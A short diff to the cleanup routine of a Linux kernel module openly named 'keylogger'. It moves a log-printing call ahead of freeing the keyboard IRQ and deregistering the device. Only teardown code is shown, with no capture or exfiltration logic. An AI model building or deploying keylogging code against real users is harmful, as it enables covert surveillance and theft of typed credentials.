@@ -355,9 +355,9 @@ static void		__exit keylogger_clean(void)
 {
 	pr_info(MODULE_NAME "Cleaning up module.\n");
 	mutex_lock(&key_log_lock);
+	key_log_print_unified();
 	free_irq(KEYBOARD_IRQ, &key_handler);
 	misc_deregister(&dev);
-	key_log_print_unified();
 	key_log_clean();
 	mutex_unlock(&key_log_lock);
 }
